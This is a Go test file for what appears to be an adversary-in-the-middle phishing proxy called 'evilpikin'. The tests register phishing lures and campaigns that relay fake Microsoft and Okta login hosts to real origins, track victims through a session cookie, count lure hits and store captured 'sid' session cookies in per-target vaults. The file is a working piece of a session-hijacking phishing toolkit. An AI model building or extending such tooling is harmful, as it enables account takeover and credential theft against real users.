package proxy

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"sync"
	"testing"

	"github.com/user/evilpikin/pkg/config"
	"github.com/user/evilpikin/pkg/lures"
)

func TestRuntimeRegistry_ConcurrentAccess(t *testing.T) {
	reg := NewRuntimeRegistry()
	var wg sync.WaitGroup
	for i := 0; i < 50; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			tok := fmt.Sprintf("tok%d", i)
			reg.RegisterLure(&config.LureInstance{Token: tok, TargetID: "microsoft", Label: "c"})
			reg.RegisterTarget("login.ms.test", NewProxyEngine(config.NewRuntimeConfig()))
			if _, ok := reg.GetLureByToken(tok); !ok {
				t.Errorf("token %s not found", tok)
			}
		}(i)
	}
	wg.Wait()
	if len(reg.TargetEngines) == 0 || len(reg.ActiveLures) == 0 {
		t.Fatal("registry lost concurrent registrations")
	}
}

func TestRuntimeRegistry_UnregisterLure(t *testing.T) {
	reg := NewRuntimeRegistry()
	reg.RegisterLure(&config.LureInstance{Token: "abc", TargetID: "microsoft"})
	if _, ok := reg.GetLureByToken("abc"); !ok {
		t.Fatal("lure should be active after register")
	}
	reg.UnregisterLure("abc")
	if _, ok := reg.GetLureByToken("abc"); ok {
		t.Fatal("lure should be gone after unregister")
	}
}

func TestRuntimeRouter_CompoundIndex(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("origin"))
	}))
	defer backend.Close()
	burl, _ := url.Parse(backend.URL)
	host := burl.Host // 127.0.0.1:port

	reg := NewRuntimeRegistry()
	engine := reg.RegisterCampaign(config.TargetSpec{
		IncomingHost: "login.ms.test",
		UpstreamHost: host,
	}, []*config.LureInstance{
		{Token: "a8f3", TargetID: "microsoft", Label: "Finance", RedirectURL: "https://bing.com"},
	})
	engine.Scheme = "http" // httptest is plaintext

	req := httptest.NewRequest("GET", "http://login.ms.test/login-reset?id=a8f3", nil)
	rec := httptest.NewRecorder()
	reg.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", rec.Code)
	}
	if rec.Body.String() != "origin" {
		t.Fatalf("expected proxied origin body, got %q", rec.Body.String())
	}
	var gotCookie bool
	for _, c := range rec.Result().Cookies() {
		if c.Name == lures.SessionCookieName {
			gotCookie = true
		}
	}
	if !gotCookie {
		t.Fatal("EP_SESS cookie was not set on first touch")
	}
	if li, _ := reg.GetLureByToken("a8f3"); li.Hits != 1 {
		t.Fatalf("expected Hits=1, got %d", li.Hits)
	}
}

func TestRuntimeRouter_UnknownHostFallsThrough(t *testing.T) {
	reg := NewRuntimeRegistry()
	req := httptest.NewRequest("GET", "http://unknown.evil.com/", nil)
	rec := httptest.NewRecorder()
	reg.ServeHTTP(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("expected 404 for unknown host, got %d", rec.Code)
	}
}

func TestRuntimeRouter_CookieOnlySubsequentHit(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("origin2"))
	}))
	defer backend.Close()
	burl, _ := url.Parse(backend.URL)

	reg := NewRuntimeRegistry()
	engine := reg.RegisterCampaign(config.TargetSpec{
		IncomingHost: "login.okta.test",
		UpstreamHost: burl.Host,
	}, []*config.LureInstance{
		{Token: "ok9", TargetID: "okta"},
	})
	engine.Scheme = "http"

	// First hit with token sets the EP_SESS cookie.
	first := httptest.NewRecorder()
	reg.ServeHTTP(first, httptest.NewRequest("GET", "http://login.okta.test/?id=ok9", nil))
	var sess string
	for _, c := range first.Result().Cookies() {
		if c.Name == lures.SessionCookieName {
			sess = c.Value
		}
	}
	if sess == "" {
		t.Fatal("no EP_SESS cookie from first hit")
	}

	// Second hit: token stripped from URL, only the cookie present.
	second := httptest.NewRecorder()
	req2 := httptest.NewRequest("GET", "http://login.okta.test/", nil)
	req2.AddCookie(&http.Cookie{Name: lures.SessionCookieName, Value: sess})
	reg.ServeHTTP(second, req2)
	if second.Code != http.StatusOK || second.Body.String() != "origin2" {
		t.Fatalf("cookie-only hit not served: code=%d body=%q", second.Code, second.Body.String())
	}
	if li, _ := reg.GetLureByToken("ok9"); li.Hits != 2 {
		t.Fatalf("expected Hits=2 across both hits, got %d", li.Hits)
	}
}

func TestVaultIsolation(t *testing.T) {
	reg := NewRuntimeRegistry()
	reg.RecordCookie("okta", "t1", &http.Cookie{Name: "sid", Value: "okta-sid"})
	reg.RecordCookie("microsoft", "t1", &http.Cookie{Name: "sid", Value: "ms-sid"})

	okta := reg.CookiesFor("okta", "t1")
	ms := reg.CookiesFor("microsoft", "t1")
	if len(okta) != 1 || okta[0].Value != "okta-sid" {
		t.Fatalf("okta vault wrong: %+v", okta)
	}
	if len(ms) != 1 || ms[0].Value != "ms-sid" {
		t.Fatalf("microsoft vault wrong: %+v", ms)
	}
	for _, c := range ms {
		if c.Value == "okta-sid" {
			t.Fatal("okta cookie leaked into microsoft vault")
		}
	}
}
